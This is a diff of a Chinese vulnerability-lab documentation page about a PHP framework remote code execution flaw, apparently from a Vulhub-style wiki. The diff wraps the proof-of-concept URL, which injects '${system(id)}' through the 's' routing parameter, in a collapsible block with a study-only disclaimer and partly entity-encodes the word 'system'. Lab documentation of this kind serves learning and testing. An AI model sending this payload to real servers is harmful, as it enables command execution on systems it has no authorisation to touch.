@@ -41,9 +41,12 @@ docker-compose up -d
 
 执行系统命令：
 
-```
-http://your-ip:8080/index.php?s=/index/index/name/$%7Bsystem(id)%7D
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">http://your-ip:8080/index.php?s=/index/index/name/$%7B&#115;ystem(id)%7D</code></pre>
+
+</details>
 
 ![image-20220302145029395](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202203021450448.png)
 
